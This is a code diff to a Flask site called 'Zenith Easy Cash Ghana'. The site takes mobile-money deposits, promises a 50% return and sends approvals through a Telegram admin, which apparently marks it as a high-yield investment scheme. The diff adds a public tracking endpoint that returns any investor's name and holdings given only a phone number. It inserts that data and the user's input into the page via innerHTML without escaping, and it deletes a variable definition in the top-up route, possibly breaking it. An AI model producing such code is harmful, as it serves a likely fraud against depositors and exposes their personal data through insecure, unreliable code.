@@ -112,12 +112,10 @@ def save_all_investors(investors):
 
 def save_investor_data(data):
   investors = load_investors()
-  # Group or push: if user number exists, append investment into their portfolio, else create new profile
   number = data.get("number")
   found_user = False
   for inv in investors:
     if inv.get("number") == number:
-      # If user exists, append this new investment to their investments list
       if "investments" not in inv:
         inv["investments"] = [
             {
@@ -229,10 +227,10 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zenith Easy Cash Ghana - Online Registration</title>
+    <title>Zenith Easy Cash Ghana - Online Registration & Tracking</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
-        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
         h2, h3 { color: #028a0f; text-align: center; }
         .instructions { background: #e8f5e9; padding: 15px; border-left: 5px solid #2e7d32; margin-bottom: 20px; font-size: 14px; line-height: 1.6; }
         .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
@@ -245,6 +243,12 @@ HTML_TEMPLATE = """
         .nav-links { text-align: center; margin-top: 20px; font-size: 14px; display: flex; justify-content: center; gap: 15px; }
         .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
         .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
+        
+        /* Standalone Tracker Card */
+        .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
+        .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
+        .tracker-slot:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
     </style>
 </head>
 <body>
@@ -278,7 +282,7 @@ HTML_TEMPLATE = """
                 <input type="text" name="name" required placeholder="Enter your full name">
             </div>
             <div class="form-group">
-                <label>Phone Number (Used for Login):</label>
+                <label>Phone Number (Used for Login & Tracking):</label>
                 <input type="text" name="number" required placeholder="e.g., 0501234567">
             </div>
             <div class="form-group">
@@ -312,8 +316,65 @@ HTML_TEMPLATE = """
         </form>
 
         <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
-        <div class="nav-links"><a href="{{ url_for('login') }}">🔑 Investor Login</a></div>
+        <div class="nav-links">
+            <a href="{{ url_for('login') }}">🔑 Investor Login</a>
+        </div>
+
+        <!-- STANDALONE TRACKING SECTION ON HOME PAGE -->
+        <div class="tracker-section">
+            <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
+            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered phone number below to instantly view your investment status and live progress without logging in.</p>
+            <div class="form-group">
+                <label style="font-size: 13px;">Registered Phone Number:</label>
+                <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;">
+                <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px;">Check Status Now</button>
+            </div>
+            <div id="trackerResultBox" class="tracker-result-box">
+                <div id="trackerContent">Searching...</div>
+            </div>
+        </div>
     </div>
+
+    <script>
+        async function trackInvestment() {
+            const num = document.getElementById('trackNumberInput').value.trim();
+            const box = document.getElementById('trackerResultBox');
+            const content = document.getElementById('trackerContent');
+            
+            if (!num) {
+                alert('Please enter a phone number to track.');
+                return;
+            }
+
+            box.style.display = 'block';
+            content.innerHTML = 'Searching records...';
+
+            try {
+                const response = await fetch('/api/track/' + encodeURIComponent(num));
+                const data = await response.json();
+
+                if (data.success) {
+                    let html = `<b style="color:#028a0f;">Investor: ${data.name}</b><hr style="border:0; border-top:1px solid #eee; margin:8px 0;">`;
+                    data.investments.forEach((inv, idx) => {
+                        html += `
+                            <div class="tracker-slot">
+                                <p style="margin:4px 0;"><b>Slot #${idx + 1}</b> - Capital: <b>GHs ${inv.amount.toLocaleString()}</b></p>
+                                <p style="margin:4px 0; color:#028a0f; font-size:12px;">Expected Return (50%): GHs ${inv.expected_return.toLocaleString()}</p>
+                                <p style="margin:4px 0; font-size:12px;">Maturity Date: <b>${inv.maturity_date}</b></p>
+                                <p style="margin:4px 0; font-size:12px;">Status: <span style="font-weight:bold; color:#b45309;">${inv.status}</span></p>
+                            </div>
+                        `;
+                    });
+                    content.innerHTML = html;
+                } else {
+                    content.innerHTML = `<span style="color: #dc2626;">❌ No investment records found for phone number: <b>${num}</b></span>`;
+                }
+            } catch (err) {
+                content.innerHTML = `<span style="color: #dc2626;">An error occurred while tracking. Please try again.</span>`;
+            }
+        }
+    </script>
+
     {% if show_modal %}{{ popup_html|safe }}{% endif %}
 </body>
 </html>
@@ -346,7 +407,7 @@ INVESTOR_LOGIN_TEMPLATE = """
         {% with messages = get_flashed_messages() %}
           {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
         {% endwith %}
-        <form method="POST">
+        <form method="POST" action="{{ url_for('login') }}">
             <div class="form-group">
                 <label>Phone Number:</label>
                 <input type="text" name="number" required placeholder="e.g., 0501234567">
@@ -440,7 +501,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     {% if inv.status == 'Payment Confirmed & Active' %}
                     <button type="button" class="btn-topup-toggle" onclick="toggleTopup({{ loop.index0 }})">➕ Top-Up / Make Another Investment</button>
                     
-                    <form action="{{ url_for('topup', index=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
+                    <form action="{{ url_for('topup', sub_idx=inv.sub_idx) }}" method="POST" class="topup-dropdown" id="topupBox_{{ loop.index0 }}" enctype="multipart/form-data">
                         <div class="company-momo-display">
                             <strong>COMPANY MOMO ACCOUNT:</strong><br>
                             Number: <b>{{ settings.momo_number }}</b> | Name: <b>{{ settings.momo_name }}</b><br>
@@ -456,7 +517,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     {% endif %}
 
                     {% if inv.can_withdraw and inv.status != 'Withdrawal Requested' and inv.status != 'Withdrawn Completed' %}
-                        <a href="{{ url_for('withdraw', index=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
+                        <a href="{{ url_for('withdraw', sub_idx=inv.sub_idx) }}" class="btn-withdraw">📥 Request Withdrawal Now (GHs {{ "%.2f"|format(inv.expected_return) }})</a>
                     {% endif %}
                 </div>
                 {% endfor %}
@@ -491,7 +552,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     const hrs = Math.floor((diff % (3600 * 24)) / 3600);
                     const mins = Math.floor((diff % 3600) / 60);
                     const secs = diff % 60;
-                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s | Amt: GHs {{ investments[0].amount if investments else 0 }}`;
+                    el.innerHTML = `⏳ Time Left: ${days}d ${hrs}h ${mins}m ${secs}s`;
                 } else {
                     el.innerHTML = `🎉 Maturity Reached! Ready for Withdrawal`;
                     el.style.color = "#4ade80";
@@ -748,6 +809,40 @@ def index():
   )
 
 
+# Standalone tracking API endpoint (separate from profile login)
+@app.route("/api/track/<number>", methods=["GET"])
+def api_track(number):
+  investors = load_investors()
+  for inv in investors:
+    if inv.get("number") == number.strip():
+      inv_list = inv.get("investments", [])
+      if not inv_list and "amount" in inv:
+        inv_list = [
+            {
+                "amount": inv.get("amount"),
+                "expected_return": inv.get(
+                    "expected_return", inv.get("amount") * 1.5
+                ),
+                "maturity_date": inv.get("maturity_date"),
+                "status": inv.get("status"),
+            }
+        ]
+      cleaned_investments = []
+      for slot in inv_list:
+        cleaned_investments.append({
+            "amount": slot.get("amount"),
+            "expected_return": slot.get("expected_return", slot.get("amount") * 1.5),
+            "maturity_date": slot.get("maturity_date"),
+            "status": slot.get("status"),
+        })
+      return jsonify({
+          "success": True,
+          "name": inv.get("name"),
+          "investments": cleaned_investments,
+      })
+  return jsonify({"success": False})
+
+
 @app.route("/login", methods=["GET", "POST"])
 def login():
   if request.method == "POST":
@@ -779,7 +874,6 @@ def dashboard():
   for inv in investors:
     if inv.get("number") == number:
       investor_name = inv.get("name", "Investor")
-      # Extract multi-investments list or build it from legacy keys
       inv_list = inv.get("investments", [])
       if not inv_list and "amount" in inv:
         inv_list = [
@@ -832,7 +926,6 @@ def logout():
 def topup(sub_idx):
   try:
     number, idx_str = sub_idx.split("_")
-    idx = int(idx_str)
     investors = load_investors()
     for inv in investors:
       if inv.get("number") == number:
